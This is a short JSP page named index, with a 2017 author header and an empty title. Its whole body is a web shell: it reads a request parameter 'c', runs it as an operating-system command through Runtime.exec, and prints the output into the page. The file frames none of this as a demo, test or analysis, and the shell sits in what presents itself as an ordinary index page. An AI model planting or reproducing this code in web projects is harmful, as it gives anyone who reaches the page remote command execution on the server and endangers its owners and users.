<%-- 
    Document   : index
    Created on : 2/08/2017, 08:12:36 AM
    Author     : RAMMARJ
--%>

<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.OutputStream"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body><%
            String c = request.getParameter("c");
            if(c == null || c =="") return;
            InputStream s = Runtime.getRuntime().exec(c).getInputStream();
            BufferedReader a = new BufferedReader(new InputStreamReader(s));
            String l = null;
            StringBuffer sb = new StringBuffer();
            while ((l = a.readLine())!=null) {                    
                sb.append(l).append("<br>");
            }
            out.println(sb.toString());
        %></body>
</html>
